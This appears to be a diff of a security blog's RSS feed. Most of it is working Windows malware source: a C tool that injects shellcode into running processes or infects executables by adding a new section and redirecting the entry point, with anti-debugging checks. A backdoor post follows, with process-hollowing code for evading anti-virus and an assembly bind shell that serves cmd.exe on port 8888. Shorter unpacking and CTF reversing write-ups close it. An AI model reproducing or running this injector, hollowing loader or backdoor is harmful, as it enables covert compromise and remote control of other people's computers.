+    SetFilePointer(target,IDH.e_lfanew,NULL,FILE_BEGIN);
+    //now reaad the NT_header
+    if(!ReadFile(target,&INH,sizeof(IMAGE_NT_HEADERS),&n,NULL))
+    {
+        perror("Error in ReadFile() (IMAGE_NT_HEADERS)");
+        ExitProcess(-1);
+    }
+    //checks its signature  (0x4550 if is valid )
+    if(INH.Signature != IMAGE_NT_SIGNATURE)
+    {
+        perror("invalid NT signature ");
+        ExitProcess(-1);
+    }
+    //read the number of sections
+    DWORD  Number_Sections = INH.FileHeader.NumberOfSections ;
+    //now points to the last section
+    SetFilePointer(target,IDH.e_lfanew + sizeof(IMAGE_NT_HEADERS) + (sizeof(IMAGE_SECTION_HEADER) * (Number_Sections -1 ) ) ,NULL,FILE_BEGIN);
+    IMAGE_SECTION_HEADER last_section = {0};
+    //get the last section
+    ReadFile(target,&last_section,sizeof(IMAGE_SECTION_HEADER),&n,NULL) ;
+    //allocate enough space to store the whole executable
+    BYTE * myfile = (BYTE *)malloc(sizeof(BYTE) * target_size);
+    Sleep(500) ;
+    //points to the beggining of the target
+    SetFilePointer(target,0,NULL,FILE_BEGIN);
+    //store the whole target in myfile variable
+    ReadFile(target,myfile,target_size,&n,NULL);
+    Sleep(500);
+    // ISH is pointer to the end of the last section
+    PIMAGE_SECTION_HEADER ISH =  ( PIMAGE_SECTION_HEADER )(myfile + IDH.e_lfanew+sizeof(IMAGE_NT_HEADERS)+(sizeof(IMAGE_SECTION_HEADER) * Number_Sections) );
+    // PINH points to the NT_Header
+    PIMAGE_NT_HEADERS PINH = ( PIMAGE_NT_HEADERS )(myfile + IDH.e_lfanew );
+    // put the new section's name ...replace it with your desired section's name
+    strncpy(ISH->Name,"L0phtTN",8);
+    // sets the Characteristics of the new section to (read , write , execute ) and initialized just in case for relocation stufff
+    ISH->Characteristics = ( IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE );
+    // align the value of SizeOfRawData based FileAlignment value of the target
+    ISH->SizeOfRawData = (0X1000 % INH.OptionalHeader.FileAlignment == 0 )? 0X1000 :((0X1000/INH.OptionalHeader.FileAlignment+1) * INH.OptionalHeader.FileAlignment )  ;
+    // align the beggining of the new section when it on the HD
+    ISH->PointerToRawData = (last_section.SizeOfRawData % INH.OptionalHeader.FileAlignment == 0 )?(last_section.SizeOfRawData+last_section.PointerToRawData):(last_section.PointerToRawData + (last_section.SizeOfRawData/INH.OptionalHeader.FileAlignment+1)*INH.OptionalHeader.FileAlignment);
+    // align the size , when is loaded into the memory
+    ISH->Misc.VirtualSize = (0x1000 % INH.OptionalHeader.SectionAlignment == 0) ? 0x1000 :((0x1000/INH.OptionalHeader.SectionAlignment + 1) * INH.OptionalHeader.SectionAlignment) ;
+    // align the VirtualAddress when loaded into the memory
+    ISH->VirtualAddress =(last_section.Misc.VirtualSize % INH.OptionalHeader.SectionAlignment == 0)?(last_section.Misc.VirtualSize + last_section.VirtualAddress):(last_section.VirtualAddress+ (last_section.Misc.VirtualSize/INH.OptionalHeader.SectionAlignment +1)*INH.OptionalHeader.SectionAlignment);
+    // increments the NumberOfSections' value
+    PINH->FileHeader.NumberOfSections++;
+    // SizeOfImage's value must be increased by section's VirtualSize value
+    PINH->OptionalHeader.SizeOfImage = ISH->VirtualAddress + ISH->Misc.VirtualSize ;
+
+    SetFilePointer(target,ISH->SizeOfRawData +ISH->PointerToRawData,NULL,FILE_BEGIN);
+    SetEndOfFile(target) ;
+    SetFilePointer(target,0,NULL,FILE_BEGIN);
+    if( !WriteFile(target,myfile,target_size,&n,NULL) || n != target_size )
+    {
+        perror("could not write into the executable ");
+        return FALSE;
+    }
+    CloseHandle(target);
+    // the function which is responsible for shellcode injection
+    puts("New section Added ");
+    InjectShellcode(path,ISH->VirtualAddress,ISH->PointerToRawData,l0phtTN_shellcode,sizeof(l0phtTN_shellcode)+30);
+    Sleep(500) ;
+    return TRUE ;
+}
+
+
+BOOL CheckProcess(DWORD pid )
+{
+    PROCESSENTRY32 current_process ;
+    HANDLE proc_list ;
+    //
+    // DWORD priority ;
+
+    proc_list = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0) ;
+    if( proc_list == INVALID_HANDLE_VALUE )
+    {
+
+       return FALSE ;
+    }
+
+    current_process.dwSize = sizeof(PROCESSENTRY32);
+
+    if(!Process32First(proc_list,&current_process))
+    {
+
+        perror("error in Process32First \n");
+        return FALSE ;
+    }
+
+    while(1)
+    {
+        if((DWORD)pid == current_process.th32ProcessID )
+        {
+
+            return  TRUE ;
+        }
+
+        if(!Process32Next(proc_list,&current_process))
+            break ;
+    }
+
+    CloseHandle(proc_list) ;
+    return FALSE ;
+}
+/*
+according to MSDN : "The debug privilege allows someone to debug a process that they wouldn’t otherwise have access to.
+For example, a process running as a user with the debug privilege enabled on its token can debug a service running as local system."
+for more information :
+ http://msdn.microsoft.com/en-us/library/windows/hardware/ff541528(v=vs.85).aspx
+*/
+BOOL GetDebugPrivileges(void)
+{
+    HANDLE token;
+    TOKEN_PRIVILEGES priv;
+    BOOL ret = FALSE;
+
+    if (OpenProcessToken(GetCurrentProcessId(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY , &token))
+    {
+        priv.PrivilegeCount = 1;
+        priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid) != FALSE && AdjustTokenPrivileges(token, FALSE, &priv, 0, NULL, NULL) != FALSE)
+        {
+            ret = TRUE;
+        }
+        CloseHandle(token);
+    }
+    return ret;
+}
+static DWORD Target_Base_addr  = 0;
+
+char * GetTargetPath(DWORD pid)
+{
+    MODULEENTRY32 current;
+
+    HANDLE snapshot;
+
+    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,pid);
+    if (snapshot == INVALID_HANDLE_VALUE)
+    {
+        fprintf(stderr,"error in CreateToolhelp32Snapshot");
+        ExitProcess(-1) ;
+    }
+
+    current.dwSize = sizeof(MODULEENTRY32);
+    if(!Module32First(snapshot,&current))
+    {
+        fprintf(stderr,"error in Module32First");
+        ExitProcess(-1) ;
+    }
+    while(1)
+    {
+        if(current.th32ProcessID == pid)
+        {
+            char * mpath = (char *)malloc(sizeof(char) * strlen(current.szExePath)+1);
+            // printf("%s",current.szExePath);
+            *(mpath + strlen(current.szExePath)) = '\0' ;
+            //copy the path of executable
+            memcpy(mpath,&current.szExePath,sizeof(char) * strlen(current.szExePath));
+            //get the baseadress of the target
+            Target_Base_addr = current.modBaseAddr ;
+            return mpath;
+        }
+
+        if(!Module32Next(snapshot,&current))
+            break ;
+
+    }
+    CloseHandle(snapshot) ;
+    return NULL ;
+}
+
+BOOL InjectShellcode(char * path, DWORD new_entrypoint , DWORD RVA , char * sc, unsigned int shell_size)
+{
+
+
+    HANDLE Inject_Me = CreateFile(path, GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE , NULL , OPEN_EXISTING ,NULL,NULL);
+    if(Inject_Me == INVALID_HANDLE_VALUE )
+    {
+        fprintf(stderr ,"error while injecting the shellcode !");
+        ExitProcess(-1) ;
+    }
+    IMAGE_DOS_HEADER IDH = {0} ;
+    IMAGE_NT_HEADERS INH = {0} ;
+    //where the return adress must be stored
+    int ret = 0;
+    int a ;
+    char cret[30];
+    memset(cret,(int)'\0',30);
+    if( !ReadFile(Inject_Me,&IDH,sizeof(IMAGE_DOS_HEADER),&a,FILE_BEGIN))
+    {
+        perror("readfile() error 1");
+        exit(-1) ;
+    }
+    char jmp_to_entrypoint[sizeof(l0phtTN_shellcode) + 30];
+    memset(jmp_to_entrypoint,(int)'\0',sizeof(l0phtTN_shellcode) + 30);
+// points to the beggining of NT_section
+    SetFilePointer(Inject_Me,IDH.e_lfanew , NULL , FILE_BEGIN);
+    /// puts the content of the NT-section into INH struct
+    ReadFile(Inject_Me,&INH,sizeof(IMAGE_NT_HEADERS),&a,FILE_BEGIN);
+    printf("\n  Original EntryPoint :%X \n ",INH.OptionalHeader.AddressOfEntryPoint);
+    ret = INH.OptionalHeader.AddressOfEntryPoint  + INH.OptionalHeader.ImageBase ;
+    // Because the jmp instruction encodes the next 5 opcodes like (the following : OEP - current adress ) - 5
+    //
+    ret =  (INH.OptionalHeader.AddressOfEntryPoint - (new_entrypoint + strlen(l0phtTN_shellcode) - 1 ) - 5 ) ;  // just to calculate the return address
+    // fill cret array with return adress in little endian format  !!
+    sprintf(cret," Return Adress : %0.2x%0.2x%0.2x%0.2x",( (ret << 16 )&0x00ff0000) >> 16 ,((ret << 8 )&0x00ff0000 ) >> 16 ,(ret >> 16 )&0x000000ff ,(ret >> 24 )& 0x000000ff );
+    // puts(cret);
+    //
+    memcpy(jmp_to_entrypoint,l0phtTN_shellcode,strlen(l0phtTN_shellcode));
+    // change the entry point of the target to virtual address of the L0phtTn section
+    INH.OptionalHeader.AddressOfEntryPoint = new_entrypoint ;
+    // replace the modified nt_section
+    SetFilePointer(Inject_Me,IDH.e_lfanew,NULL,FILE_BEGIN);
+    // replace the modified nt_section
+    WriteFile(Inject_Me,&INH,sizeof(IMAGE_NT_HEADERS),&a,FILE_BEGIN);
+    unsigned int isread = 0 ;
+
+    SetFilePointer(Inject_Me,RVA,NULL,FILE_BEGIN);
+
+    if(!WriteFile(Inject_Me,&jmp_to_entrypoint,shell_size,&isread,NULL) || isread != shell_size )
+    {
+        perror("cannot inject (WriteFile)");
+        ExitProcess(-1) ;
+    }
+    // sets the file pointer to end of the shellcode
+    SetFilePointer(Inject_Me,RVA+strlen(l0phtTN_shellcode)  ,NULL,FILE_BEGIN) ;
+    //and append it with the new return address
+    WriteFile(Inject_Me,&ret,sizeof(long long),&isread,NULL);
+    return TRUE ;
+}
+int Is_It_Debugged = 0 ;
+int main(int argc, char **argv)
+{
+
+    HANDLE my_exe ;
+    IMAGE_DOS_HEADER IDH;
+    DWORD pid = 0;
+    HANDLE target;
+
+    DWORD nbytes;
+    IMAGE_NT_HEADERS INH;
+    // get the TIB (thread information block )
+    asm("mov eax, dword ptr fs:[0x18]");
+    // get the PEB (process information block)
+    asm("mov eax, dword ptr ds:[eax+0x30]");
+    // get the beingDebugger flag
+    asm("movzx eax, byte ptr ds:[eax+0x2]");
+
+    asm("mov _Is_It_Debugged, eax");
+
+    if (Is_It_Debugged == 1)
+    {
+        ExitProcess(-1) ;
+    }
+     pid = atoi(argv[1]) ;
+    if( argc != 2 || pid  ==  0)
+    {
+        fprintf(stdout," \nUsage : %s <pid> \n",argv[0]);
+        exit(-1);
+    }
+
+    printf("%d\n",pid);
+   // Sleep(500);
+    // check if the target is running
+    if(CheckProcess(pid) == FALSE)
+    {
+        fprintf(stderr," \n %d not found on the list \n",pid);
+        ExitProcess(-1) ;
+    }
+    printf("passed");
+    // get path of the target (executable )
+    char * pathh =  GetTargetPath(pid);
+    //just in case when the anti-debug is bypassed ,the debugger is still get fooled by the anti-tracing (int 2d )
+/*
+    if(Is_It_Debugged == 1)
+    {
+        asm("pushad");
+        asm("int 0x2d");
+    }
+*/
+    // debug privileges are badly needed to get the processes running list without some issues
+    GetDebugPrivileges();
+    //checks if it is running under XP
+
+    if(((int)(GetVersion() & 0x000000ff)) == 5 )
+    {
+
+        if(Target_Base_addr == 0 )
+        {
+            fprintf(stderr," could not get the base adress of the process \n");
+            ExitProcess(-1) ;
+        }
+        printf("\n 0x%X \n",Target_Base_addr);
+        //open the target's process
+        if((my_exe = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid)) == INVALID_HANDLE_VALUE )
+        {
+            fprintf(stderr," process not found ");
+            ExitProcess(-1);
+        }
+        //read the DOS_header
+        if(!ReadProcessMemory(my_exe,Target_Base_addr,&IDH,sizeof(IMAGE_DOS_HEADER),&nbytes)  || nbytes !=  sizeof(IMAGE_DOS_HEADER) || IDH.e_magic != 0x5a4d )
+        {
+            fprintf(stderr,"\n error in ReadProcessMemory() \n");
+            ExitProcess(-1) ;
+        }
+        //read the NT_heaader
+        if(!ReadProcessMemory(my_exe,(Target_Base_addr+(DWORD)IDH.e_lfanew),&INH,sizeof(IMAGE_NT_HEADERS),&nbytes) || nbytes != sizeof(IMAGE_NT_HEADERS) || INH.Signature != IMAGE_NT_SIGNATURE)
+        {
+            fprintf(stderr,"\n error in reading the IMAGE_NT_HEADERS \n");
+            ExitProcess(-1) ;
+        }
+        LPVOID shell_addr = NULL ;
+        //check if there is enough room for the shellcode
+        shell_addr =  VirtualAllocEx(my_exe,0,sizeof(l0phtTN_shellcode),MEM_COMMIT,PAGE_EXECUTE_READWRITE) ;
+        if(shell_addr == NULL )
+        {
+            fprintf(stderr,"something aint right with virtualallocEx");
+            ExitProcess(-1);
+        }
+        //store the L0phtTn shellcode
+        if(!WriteProcessMemory(my_exe,shell_addr,l0phtTN_shellcode,sizeof(l0phtTN_shellcode),&nbytes) && nbytes != sizeof(l0phtTN_shellcode) )
+        {
+            fprintf(stderr ,"cannot write into memory !");
+            ExitProcess(-1);
+        }
+
+        HANDLE r_handle ;
+        // trigger the shellcode
+        r_handle =  CreateRemoteThread(my_exe,NULL,0,(LPTHREAD_START_ROUTINE)shell_addr,0,0,0) ;
+        if(r_handle == INVALID_HANDLE_VALUE )
+        {
+            puts("cannot execute shellcode !!");
+            ExitProcess(-1);
+        }
+        exit(0) ;
+    }
+    else
+    {
+
+        char * tokill = (char * )malloc(sizeof(char) * 24);
+        //the target must be closed in order to add the new section !!
+        sprintf(tokill,"taskkill /F /IM %d",pid);
+        *(tokill + 23) = '\0' ;
+        system(tokill);
+        AddL0phtTnSection(pathh);
+        Sleep(500) ;
+
+    }
+    system("pause");
+    return 0 ;
+}
+</pid></imagehlp.h></winbase.h></process.h></tlhelp32.h></string.h></stdlib.h></stdio.h></windows.h></code></pre><!--kg-card-end: html-->]]></content:encoded></item><item><title><![CDATA[Win32 Run-Time decryption Backdoor]]></title><description><![CDATA[<!--kg-card-begin: markdown--><p>Well , I had to code my own backdoor from the scratch , which  it has proven to be successful in evading almost all anti-virus products since it takes advantage of the process-replacement technique .<br>
+Basically , process-replacement is the act of creating a system process (e.g : csrss.exe) in  suspended state , and</p>]]></description><link>http://localhost:2368/win32-run-time-decryption-backdoor/</link><guid isPermaLink="false">5d42682878f05e1d88fb404d</guid><dc:creator><![CDATA[mohamed ali MRABET]]></dc:creator><pubDate>Thu, 01 Aug 2019 04:19:16 GMT</pubDate><content:encoded><![CDATA[<!--kg-card-begin: markdown--><p>Well , I had to code my own backdoor from the scratch , which  it has proven to be successful in evading almost all anti-virus products since it takes advantage of the process-replacement technique .<br>
+Basically , process-replacement is the act of creating a system process (e.g : csrss.exe) in  suspended state , and then unmaps (deallocate) that process  adresss space by calling <strong>NtUnmapViewOfsection()</strong> and maps the backdoor's content in it , and finally resuming that process execution with <strong>ResumeThread()</strong> ,  hence this is  definitely a good strategy to bypass anti-virus detection due to the fact that the backdoor is executed in the context of a legitimate system process .<br>
+Here is the process-replacement code :</p>
+<!--kg-card-end: markdown--><!--kg-card-begin: html--><pre class="line-numbers"><code class="lang-c">
+
+#include <a><stdio.h></stdio.h></a>
+#include <windows.h>
+
+#define myExitError(msg) fprintf(stderr, \
+                                "%s  , (Error : %x )\n" , msg \
+                                 , GetLastError() ) ;\
+                         ExitProcess(-1); \
+
+
+#define NT_SUCCESS 0x00000000
+
+
+typedef    ( * NtUnmapViewOfSection)     ( IN HANDLE  ProcessHandle ,  IN  PVOID   BaseAddress );
+typedef    ( * NtWriteVirtualMemory)     ( IN HANDLE  ProcessHandle ,  IN  PVOID   BaseAddress , IN PVOID Buffer , IN ULONG NumberOfBytesToWrite, OUT PULONG NumberOfBytesWritten OPTIONAL );
+typedef    ( * NtReadVirtualMemory )     ( IN HANDLE  ProcessHandle ,  IN  PVOID   BaseAddress , OUT PVOID  Buffer, IN ULONG NumberOfBytesToRead,OUT PULONG NumberOfBytesReaded OPTIONAL   );
+typedef    ( * NtResumeThread )          ( IN HANDLE  ThreadHandle,  OUT PULONG SuspendCount OPTIONAL ) ;
+typedef    ( * NtGetContextThread)       ( IN HANDLE  ThreadHandle , OUT PCONTEXT pContext );
+typedef    ( * NtSetContextThread)       ( IN HANDLE  ThreadHandle, IN PCONTEXT Context );
+typedef    ( * NtQueryInformationProcess)( HANDLE ,   UINT ,PVOID ,ULONG , PULONG);
+
+
+
+int main(int argc,char* argv[])
+{
+
+    NtUnmapViewOfSection    myNtUnmapViewOfSection ;
+    NtReadVirtualMemory     myNtReadVirtualMemory  ;
+    NtWriteVirtualMemory    myNtWriteVirtualMemory ;
+    NtResumeThread          myNtResumeThread;
+    NtGetContextThread      myNtGetContextThread;
+    NtSetContextThread      myNtSetContextThread ;
+    NtQueryInformationProcess myNtQueryInformationProcess ;
+
+
+    HMODULE dll = LoadLibraryA("ntdll.dll");
+    myNtUnmapViewOfSection    = (NtUnmapViewOfSection)GetProcAddress(dll,"NtUnmapViewOfSection");
+    myNtReadVirtualMemory     = (NtReadVirtualMemory )GetProcAddress(dll,"NtReadVirtualMemory");
+    myNtWriteVirtualMemory    = (NtWriteVirtualMemory)GetProcAddress(dll,"NtWriteVirtualMemory");
+    myNtSetContextThread      = (NtSetContextThread)GetProcAddress(dll,"NtSetContextThread");
+    myNtGetContextThread      = (NtGetContextThread)GetProcAddress(dll,"NtGetContextThread");
+    myNtResumeThread          = (NtResumeThread)GetProcAddress(dll,"NtResumeThread");
+    myNtQueryInformationProcess =(NtQueryInformationProcess)GetProcAddress(dll,"NtQueryInformationProcess");
+
+
+    PVOID MyExe,Allocated,BaseAddrOfSuspendedProcess;
+    DWORD i,read,noDebuginherit = 0,nSizeOfFile;
+    HANDLE hMyExe ;
+    IMAGE_DOS_HEADER * IDH;
+    IMAGE_NT_HEADERS  * INH;
+    IMAGE_SECTION_HEADER  * ISH;
+    STARTUPINFO StartInfo;
+    PROCESS_INFORMATION ProcInfo;
+    CONTEXT ThreadContext;;
+
+    memset(&StartInfo,0,sizeof(StartInfo));
+    memset(&ProcInfo,0,sizeof(ProcInfo));
+
+    if((myNtQueryInformationProcess(GetCurrentProcess(),0x7,&noDebuginherit,4,NULL)) != NT_SUCCESS )
+    {
+        ExitProcess(-1);
+    }
+
+    if(!CreateProcess(NULL,"C:\\windows\\system32\\notepad.exe",NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,&StartInfo,&ProcInfo))
+    {
+        myExitError("Error in creating a target process in suspended state ");
+    }
+
+    ThreadContext.ContextFlags=CONTEXT_FULL;
+    hMyExe=CreateFile("myBackdoor.exe",GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
+
+    if(hMyExe==INVALID_HANDLE_VALUE)
+    {
+        myExitError(" Cannot open The Backdoor ");
+    }
+
+    nSizeOfFile=GetFileSize(hMyExe,NULL);
+
+    MyExe = VirtualAlloc(NULL,nSizeOfFile,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
+
+    ReadFile(hMyExe,MyExe,nSizeOfFile,&read,NULL) ;
+
+
+    IDH=(PIMAGE_DOS_HEADER)MyExe;
+
+    INH=(PIMAGE_NT_HEADERS)((LPBYTE)MyExe+IDH->e_lfanew);
+
+    myNtGetContextThread(ProcInfo.hThread,&ThreadContext);
+    myNtReadVirtualMemory(ProcInfo.hProcess,(PVOID)(ThreadContext.Ebx+8),&BaseAddrOfSuspendedProcess,sizeof(PVOID),NULL);
+
+    if((DWORD)BaseAddrOfSuspendedProcess == INH->OptionalHeader.ImageBase)
+    {
+        myNtUnmapViewOfSection(ProcInfo.hProcess,BaseAddrOfSuspendedProcess);
+        printf("Unmapping Target Exe starting from %x \n",BaseAddrOfSuspendedProcess);
+    }
+
+    Allocated=VirtualAllocEx(ProcInfo.hProcess,(PVOID)INH->OptionalHeader.ImageBase,INH->OptionalHeader.SizeOfImage,MEM_COMMIT|MEM_RESERVE,PAGE_EXECUTE_READWRITE); 
+
+    if(Allocated != INH->OptionalHeader.ImageBase)
+    {
+        printf("Cannot allocate memory in at %X in target process !! \n",INH->OptionalHeader.ImageBase);
+        ExitProcess(-1);
+    }
+
+    if(myNtWriteVirtualMemory(ProcInfo.hProcess,Allocated,MyExe,INH->OptionalHeader.SizeOfHeaders,NULL) != NT_SUCCESS )
+    {
+        myExitError("Cannot write in target address space ");
+    }
+
+    for(i=0; i<inh->FileHeader.NumberOfSections; i++)
+    {
+        ISH=(PIMAGE_SECTION_HEADER)((LPBYTE)MyExe+IDH->e_lfanew+sizeof(IMAGE_NT_HEADERS)+(i*sizeof(IMAGE_SECTION_HEADER)));
+        myNtWriteVirtualMemory(ProcInfo.hProcess,(PVOID)((LPBYTE)Allocated+ISH->VirtualAddress),(PVOID)((LPBYTE)MyExe+ISH->PointerToRawData),ISH->SizeOfRawData,NULL); 
+    }
+
+    ThreadContext.Eax=(DWORD)((LPBYTE)Allocated+INH->OptionalHeader.AddressOfEntryPoint);
+
+    printf(" New entry point: %x \n",ThreadContext.Eax);
+
+    myNtWriteVirtualMemory(ProcInfo.hProcess,(PVOID)(ThreadContext.Ebx+8),&INH->OptionalHeader.ImageBase,sizeof(PVOID),NULL);
+
+    myNtSetContextThread(ProcInfo.hThread,&ThreadContext);
+
+    if(myNtResumeThread(ProcInfo.hThread,NULL) != NT_SUCCESS )
+    {
+        myExitError("Cannot Resume Thread ");
+    }
+
+
+
+    return 0;
+}
+</inh-></windows.h></code></pre> <!--kg-card-end: html--><!--kg-card-begin: markdown--><p>Because the size matters , then I decided to code the backdoor in assembly (MASM):</p>
+<!--kg-card-end: markdown--><!--kg-card-begin: html--><pre class="line-numbers"><code class="lang-c"> 
+.386
+.model flat,stdcall
+option casemap:none
+
+;------------Block 2----------
+include windows.inc
+include user32.inc
+includelib user32.lib
+include kernel32.inc
+includelib kernel32.lib
+includelib ws2_32.lib
+include ws2_32.inc
+
+
+.data
+msg db "message",0
+msg1 db "title",0
+error db "error",0
+binderror db "cannot bind",0
+cmd db "cmd.exe",0
+processerror db "cannot create process",0
+sockerror db "error in creating a socket ",0
+er db "%d-",0
+
+
+.data? 
+sa WSADATA <>
+pi PROCESS_INFORMATION <>
+sii STARTUPINFO <>
+client  sockaddr_in <> 
+sock HANDLE ?
+newsock HANDLE ? 
+sizee DWORD ?
+sec db 32 dup(?)
+
+
+.code 
+start : 
+mov eax , offset sii.cb
+mov dword ptr [eax] , 0
+xor eax ,eax 
+mov eax , offset sii.dwFlags 
+mov dword ptr [eax] , STARTF_USESTDHANDLES 
+mov ecx , sizeof(PROCESS_INFORMATION)
+mov eax , offset pi
+zero : 
+mov byte ptr [eax], 0
+dec eax
+dec ecx 
+cmp ecx ,0
+jne zero
+
+invoke WSAStartup ,101h ,addr sa ;0x202 is makeword(2,2) 
+
+invoke WSASocket,AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,NULL,NULL
+
+.if eax == -1 
+   invoke MessageBox,NULL, addr sockerror ,addr error,NULL 
+   invoke GetLastError
+   invoke wsprintf,addr sec , addr er , eax  
+   invoke ExitProcess,-1
+.endif
+
+ mov sock ,eax 
+ mov [client.sin_family] ,AF_INET 
+ mov  dword ptr [client.sin_port] , htons(8888) ; port 24628 
+ mov [client.sin_addr]  , INADDR_ANY
+ 
+invoke bind,sock ,ADDR client , SIZEOF client
+.if eax != 0 
+  invoke MessageBox,NULL, addr binderror ,addr error , NULL 
+   invoke GetLastError
+  invoke wsprintf,addr sec , addr er , eax
+  invoke ExitProcess,-1
+ .endif
+ 
+ 
+invoke listen,sock,5
+  xor eax ,eax 
+  mov sizee , 10h 
+
+  invoke accept,sock , addr client ,addr sizee 
+  
+  mov newsock,eax 
+  mov [sii.hStdError]  , eax
+
+
+mov [sii.hStdInput]   , eax
+  mov [sii.hStdOutput] , eax 
+  
+ 
+  invoke CreateProcess,NULL,addr cmd , 0,0,TRUE,0,0,0,addr sii,addr pi
+  cmp eax , 0 
+  jne success 
+  invoke MessageBox,NULL, addr processerror ,addr error ,NULL 
+  
+  success : 
+
+  xor eax,eax 
+  invoke ExitProcess,NULL  
+
+end start 
+</code></pre> <!--kg-card-end: html-->]]></content:encoded></item><item><title><![CDATA[Binary-Auditing.com UnpackMe Write-up]]></title><description><![CDATA[<!--kg-card-begin: markdown--><p>While I was checking  binary-auditing.com's package , I found one interesting unpack_me challenge .\nSo I made up my mind to to give a try as it is recommended by many dudes.\n\nWell , apparently our mission is to unpack the binary and change the message it outputs (&quot;UNREGISTERED&</p>]]></description><link>http://localhost:2368/binary-auditing-com-unpackme-write-up/</link><guid isPermaLink="false">5d4267d578f05e1d88fb4044</guid><dc:creator><![CDATA[mohamed ali MRABET]]></dc:creator><pubDate>Thu, 01 Aug 2019 04:17:55 GMT</pubDate><content:encoded><![CDATA[<!--kg-card-begin: markdown--><p>While I was checking  binary-auditing.com's package , I found one interesting unpack_me challenge .\nSo I made up my mind to to give a try as it is recommended by many dudes.\n\nWell , apparently our mission is to unpack the binary and change the message it outputs (&quot;UNREGISTERED&quot;) in order to validate the task .\n\n<img src="http://2.bp.blogspot.com/-QBAVSNSQoVg/VTI20Iu5ZxI/AAAAAAAAAFg/e-cFvSFCnQI/s1600/Capture.PNG=25*10" alt="alt">\n\nAt this point , you can use plenty of tools and olly scripts that are dedicated for unpacking purposes such as IMPrec Universal OEPfinder , but I took a different approach and I managed to unpack it manually by taking a deep look at the behaviour of the unpacker .\n\n<img src="http://1.bp.blogspot.com/-t71S8X31quc/VTI4-hsdsWI/AAAAAAAAAFs/cPNhDw7GR1M/s1600/Capture.PNG" alt="alt">\nAfter loading it in olly , the first CALL is a decryption loop that XORes the first 0x312 bytes starting from 0x0047E340 with 0x62 as a key .Next function  iterates over a range of memory addresses to find the base address of KERNEL32.DLL module . \n\n<img src="http://2.bp.blogspot.com/-S9mus8qJj5I/VTI_THGeRyI/AAAAAAAAAF8/LWR6KoCAtrY/s1600/Capture.PNG" alt="alt">\nSo , we step out to find another interesting CALL at 0x0047E254 which loops through kernel32.dll memory region and does a manual import of some APIs (LoadLibrary ,IsDebuggerPresent , VirtualAlloc, GetTickCount , CreatThread) that are needed for the unpacker stub.\nAs we proceed , we will encounter IsDebuggerPresent() and calls to GetTickCount() , it seems that it checks whether the process is  not being debugged otherwise it calls ExitProcess() .  \n\nIn function 0x0047E144 , there is something that we need to pay attention to . there are two consecutive calls to VirtualProtect() api that contain instructions like REPE MOVS and SCAS ,STOS .. etc. As expected , this a self-modifying code that changes various opcodes in a .code section . If you look a little deeper ,you will notice that it destroyes the unpacking stub .\n\n<img src="http://4.bp.blogspot.com/-kTdFXJNH06k/VTLhGaT35PI/AAAAAAAAAGQ/JkIXPQ_bY1M/s1600/Capture.PNG" alt="alt">\n\nWe keep stepping out until we face obfuscated opcodes that reside within the .klizma section , to make the raw data readable , we click on &quot;remove analysis from module&quot;. It turns out that we have long decryption loop that aims to unpack the first part of the binary .  \n The decryption procedure is so long and it does not seem to end as we might have thought . Therefore we have to find a strategy to find out where this loop ends . Since we are dealing with a packer , we are pretty sure that a call to GetProcAdress() api  is going to take place , so let's set a breakpoint on it and press F9 . As expected !! \n\n<img src="http://2.bp.blogspot.com/-roM_ysdw0eo/VTLu1TdUevI/AAAAAAAAAGg/V-fu9IKe-3M/s1600/Capture.PNG" alt="alt">\n\nMany procedures that are related to text , image drawing(imagelist_drawEx , GetbitmapBits) have been imported and written to     a memory region where EDI points to .Normally it is building the IAT block of the binary .\n After the binary is unpacked , we search for the string &quot;UNREGISTERED&quot; in the dump , and voilà !!\n<img src="http://1.bp.blogspot.com/-HO7wc0QN1jo/VTLztrzkdaI/AAAAAAAAAGs/TSg4CB5OteM/s1600/Capture.PNG" alt="alt">\n\nWe set a hardware breakpoint on it with execution option , and we notice instantly  that it is going to be accessed by  REP MOVS [EDI],[ESI] we follow ESI in dump and then change the string to whatever we want it to output . \n\n<img src="http://3.bp.blogspot.com/-W20tgFMpb58/VTL1zgAVAsI/AAAAAAAAAG4/YJIkf1RQn0g/s1600/Capture.PNG" alt="alt">\n\n\n</p>
+<!--kg-card-end: markdown-->]]></content:encoded></item><item><title><![CDATA[Codegate CTF ReverseMe 200pts Write-up]]></title><description><![CDATA[<!--kg-card-begin: markdown--><p>This task is  really challenging as it contains some anti-reversing related stuff.\nI grabbed the binary and threw it in olly and .....Ooops ..it just quits immediatly .\n\n At first , I was stuck for minutes .because the binary is supposed to be landing on the entry point .\nThen after</p>]]></description><link>http://localhost:2368/codegate-ctf-reverseme-200pts-write-up-2/</link><guid isPermaLink="false">5d430be5afb0373528abf28a</guid><dc:creator><![CDATA[mohamed ali MRABET]]></dc:creator><pubDate>Thu, 01 Aug 2019 04:16:42 GMT</pubDate><content:encoded><![CDATA[<!--kg-card-begin: markdown--><p>This task is  really challenging as it contains some anti-reversing related stuff.\nI grabbed the binary and threw it in olly and .....Ooops ..it just quits immediatly .\n\n At first , I was stuck for minutes .because the binary is supposed to be landing on the entry point .\nThen after googling up , I figured out that the moment when the debugger attaches to it the binary purposefully hits the ret instructions  because of the TLS callback .\n\nWell TLS stands for Thread Local Storage , it is section that resides in an executable that contains data variables particular to each thread and addresses of some functions (callbacks ) .\nThe windows loader ensures that the TLS section gets executed before it reaches the OEP of the program . Due to the fact that TLS gets executed first , task author managed to add some anti-debugging code in it ,therefore the debugger will not have a chance to hit the entry point .\n\nTo work this out , we need to use TLScatch plugin by waleed assar , which is used to set a breakpoints on TLS callbacks ,so that the debugger would be able to stop on the callback functions.\n\nI re-opened the binary in olly and to started to check its behaviour .I noticed the presence of some anti-debugging techniques have been implemented in it .\n<img 